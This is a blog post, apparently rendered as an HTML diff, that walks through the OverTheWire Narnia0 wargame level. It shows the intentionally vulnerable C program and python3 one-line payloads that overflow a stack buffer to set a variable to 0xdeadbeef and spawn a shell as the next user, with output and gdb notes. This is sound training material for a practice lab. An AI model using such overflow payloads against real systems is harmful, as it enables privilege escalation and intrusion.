@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Narnia0 :: exploit dev</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Back in 2016, I started with bandit and it left it at that&hellip;
+Now, a decade after I pick up narnia.
+Login is standard as in any OTW wargame with an SSH.
+ssh narnia0@narnia.labs.overthewire.org -p2226 In case of narnia, all target C code (for white-box analysis) and the corresponding binaries are at /narnia location. Passphrases to the next levels are at /etc/narnia_pass/narnia/.
+Now, that we are in, lets inspect the C code for narnia0.
+" />
+<meta name="keywords" content=", " />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/posts/narnia0/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.7d96875ab64e4666f6b663bd6b9529f9a867dd3fadc2b1edee24b8cef46107c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.f07caa97966b6418dc9fb7cf61c1655ee5e4c5ac85df19cd307f36af17ed0817.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Narnia0">
+<meta property="og:description" content="Back in 2016, I started with bandit and it left it at that&hellip;
+Now, a decade after I pick up narnia.
+Login is standard as in any OTW wargame with an SSH.
+ssh narnia0@narnia.labs.overthewire.org -p2226 In case of narnia, all target C code (for white-box analysis) and the corresponding binaries are at /narnia location. Passphrases to the next levels are at /etc/narnia_pass/narnia/.
+Now, that we are in, lets inspect the C code for narnia0.
+" />
+<meta property="og:url" content="http://localhost:1313/posts/narnia0/" />
+<meta property="og:site_name" content="exploit dev" />
+
+  
+  
+  <meta property="og:image" content="http://localhost:1313/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-02-10 10:08:57 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="http://localhost:1313/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/narnia0/">Narnia0</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-02-10</time><span class="post-author">0x4ngk4n</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/narnia/">narnia</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/overthewire/">overthewire</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Back in 2016, I started with bandit and it left it at that&hellip;<br>
+Now, a decade after I pick up <strong>narnia</strong>.</p>
+<p>Login is standard as in any OTW wargame with an SSH.</p>
+<pre tabindex="0"><code>ssh narnia0@narnia.labs.overthewire.org -p2226
+</code></pre><p>In case of narnia, all target C code (for white-box analysis) and the corresponding binaries are at <code>/narnia</code> location.
+Passphrases to the next levels are at <code>/etc/narnia_pass/narnia/</code>.</p>
+<p>Now, that we are in, lets inspect the C code for <code>narnia0</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> val<span style="color:#f92672">=</span><span style="color:#ae81ff">0x41414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">20</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Here is your chance: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%24s&#34;</span>,<span style="color:#f92672">&amp;</span>buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;buf: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,buf);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;val: 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,val);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(val<span style="color:#f92672">==</span><span style="color:#ae81ff">0xdeadbeef</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setreuid</span>(<span style="color:#a6e22e">geteuid</span>(),<span style="color:#a6e22e">geteuid</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;WAY OFF!!!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The success condition in the above code seems to rely on the value of the variable <code>val</code>.
+So, how can we affect this value to <code>0xdeadbeef</code> to reach the success code branch?</p>
+<p>Well, we can also observe a classic buffer overflow in this case.<br>
+We allocate 20 bytes to the char buffer <code>buf</code> whereas, user&rsquo;s input is 24 bytes into the <code>buf</code> (thus a scope of 4 byte overflow).\</p>
+<p>Let&rsquo;s execute the binary and provide an input to verify if we can overwrite the value of the <code>val</code> variable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia0@narnia:/narnia$ python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;A&#39;*20 + b&#39;B&#39;*4)&#34;</span> | ./narnia0
+</span></span><span style="display:flex;"><span>Correct val<span style="color:#ae81ff">\&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
+</span></span><span style="display:flex;"><span>Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
+</span></span><span style="display:flex;"><span>val: 0x42424242
+</span></span><span style="display:flex;"><span>WAY OFF!!!!
+</span></span></code></pre></div><p>That was simple enough&hellip; we can control the value to th <code>val</code> variable. Now we need to pivot to the success code path by changing <code>val</code> to <code>0xdeadbeef</code>.<br>
+Note that we&rsquo;d need to supply the <code>0xdeadbeef</code> in little endian ordering as it&rsquo;s intel architecture.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia0@narnia:/narnia$ python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;A&#39;*20 + b&#39;\xef\xbe\xad\xde&#39;*4)&#34;</span> | ./narnia0
+</span></span><span style="display:flex;"><span>Correct val<span style="color:#ae81ff">\&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
+</span></span><span style="display:flex;"><span>Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
+</span></span><span style="display:flex;"><span>val: 0xdeadbeef
+</span></span><span style="display:flex;"><span>narnia0@narnia:/narnia$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>14000<span style="color:#f92672">(</span>narnia0<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>14000<span style="color:#f92672">(</span>narnia0<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>14000<span style="color:#f92672">(</span>narnia0<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Well, it worked but we are still <code>narnia0</code> not <code>narnia1</code>. Why?
+Looking at the code closely, it seems to be this snippet:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(val<span style="color:#f92672">==</span><span style="color:#ae81ff">0xdeadbeef</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setreuid</span>(<span style="color:#a6e22e">geteuid</span>(),<span style="color:#a6e22e">geteuid</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>So, when passing value to scanf via a pipe <code>|</code>, our python invocation provides the strings to the program and when it goes to the <code>system</code> call to <code>/bin/sh</code>, the input steam has already come to an end. The <code>sh</code> shell has nothing to provide to it&rsquo;s standard input and the program exits.
+We need a way to either hold the shell by keeping the stdin from the <code>|</code> open or provide it a shell command to execute.</p>
+<ul>
+<li>
+<p>Approach 1:
+We pass the command to execute as a string to the pipe</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> narnia0@narnia:/narnia$ <span style="color:#f92672">(</span>python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;A&#39;*20 + b&#39;\xef\xbe\xad\xde&#39;*4)&#34;</span>; echo <span style="color:#e6db74">&#39;id&#39;</span><span style="color:#f92672">)</span> | ./narnia0
+</span></span><span style="display:flex;"><span> Correct val<span style="color:#960050;background-color:#1e0010">&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
+</span></span><span style="display:flex;"><span> Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
+</span></span><span style="display:flex;"><span> val: 0xdeadbeef
+</span></span><span style="display:flex;"><span> uid<span style="color:#f92672">=</span>14001<span style="color:#f92672">(</span>narnia1<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>14000<span style="color:#f92672">(</span>narnia0<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>14000<span style="color:#f92672">(</span>narnia0<span style="color:#f92672">)</span>
+</span></span></code></pre></div></li>
+<li>
+<p>Approach 2:
+The command <code>cat</code> when provided with no arguments basically funnels stdin to stdout and thus holds the <code>/bin/sh</code> shell the binary provides.
+In this case we land an interactive shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>narnia0@narnia:/narnia$ <span style="color:#f92672">(</span>python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;A&#39;*20 + b&#39;\xef\xbe\xad\xde&#39;*4)&#34;</span>; cat<span style="color:#f92672">)</span> | ./narnia0
+</span></span><span style="display:flex;"><span>Correct val<span style="color:#960050;background-color:#1e0010">&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
+</span></span><span style="display:flex;"><span>Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
+</span></span><span style="display:flex;"><span>val: 0xdeadbeef
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>14001<span style="color:#f92672">(</span>narnia1<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>14000<span style="color:#f92672">(</span>narnia0<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>14000<span style="color:#f92672">(</span>narnia0<span style="color:#f92672">)</span>
+</span></span></code></pre></div></li>
+</ul>
+<p><strong>Extra bits</strong>
+It is interesting to know how these variables are located in the memory and thus I decided I&rsquo;d inspect via <code>gdb</code> as well.</p>
+<p>Firstly, lets look at the disassembly of the binary.
+<img src="./img.png" alt="disassemble main"></p>
+<p>I specifically set a breakpoint at <code>b *main+49</code> where the <code>scanf</code> instruction was while reading the user input.<br>
+Also, note the instructon at <code>*main+7</code> which is <code>mov DWORD PTR [ebp-0x8], 0x41414141</code>. This corresponds to the C code <code>long val=0x41414141;</code>.</p>
+<p>Which means that <code>val</code> is at location [ebp-0x8]. And the next variable <code>buf</code> being a char array of 20 size (0x14) is located at the relative address of [ebp-(0x8+0x14)], i.e. <code>[ebp-0x1c]</code>. As variables are located on the stack, this shows how the stack is incremeted for every new variable, just incremented in the negative direction.</p>
+<p>Look how, when stepping over the <code>scanf</code> instruction, the value of <code>val</code> at <code>[ebp-0x8]</code> gets overwritten (or overflowed).
+<img src="./img2.png" alt="eXamine x gdb command"></p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
